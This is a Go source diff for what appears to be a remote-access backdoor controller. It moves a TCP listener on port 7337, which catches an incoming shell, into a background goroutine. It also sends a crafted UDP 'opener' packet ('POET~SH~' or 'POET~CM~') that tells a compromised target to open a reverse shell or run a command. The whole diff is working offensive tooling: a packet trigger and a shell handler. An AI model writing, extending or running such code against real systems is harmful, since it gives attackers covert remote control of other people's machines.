@@ -55,6 +55,28 @@ func stream_copy(src io.Reader, dst io.Writer) <-chan int {
 	return sync_channel
 }
 
+func shell_listen(source string) {
+	listener, err := net.Listen("tcp", source+":7337")
+	if err != nil {
+		log.Fatalln(err)
+	}
+
+	con, err := listener.Accept()
+	if err != nil {
+		log.Fatalln(err)
+	}
+
+	b, err := f.ReadFile("art.txt")
+	if err != nil {
+		panic(err)
+	}
+	fmt.Println(string(b)) // ascii art ;)
+
+	log.Println("Connected: ", con.RemoteAddr())
+
+	tcp_con_handle(con)
+}
+
 func main() {
 	var iFace string
 	var source string
@@ -87,7 +109,8 @@ func main() {
 
 	var opener string
 	if shell {
-		opener = "POET~SH~" + source // TODO change in C code
+		opener = "POET~SH~" + source
+		go shell_listen(source) // start background listener
 	} else if command == "NONE" {
 		flag.Usage()
 		return
@@ -95,27 +118,6 @@ func main() {
 		opener = "POET~CM~" + command
 	}
 
+	fmt.Printf("Sending to %s: %s", target, opener)
 	sendUDPPacket(iFace, source, target, opener, 77, 7714)
-
-	if shell {
-		listener, err := net.Listen("tcp", source+":7337") // TODO change port
-		if err != nil {
-			log.Fatalln(err)
-		}
-
-		con, err := listener.Accept()
-		if err != nil {
-			log.Fatalln(err)
-		}
-
-		b, err := f.ReadFile("art.txt")
-		if err != nil {
-			panic(err)
-		}
-		fmt.Println(string(b)) // ascii art ;)
-
-		log.Println("Connected: ", con.RemoteAddr())
-
-		tcp_con_handle(con)
-	}
 }
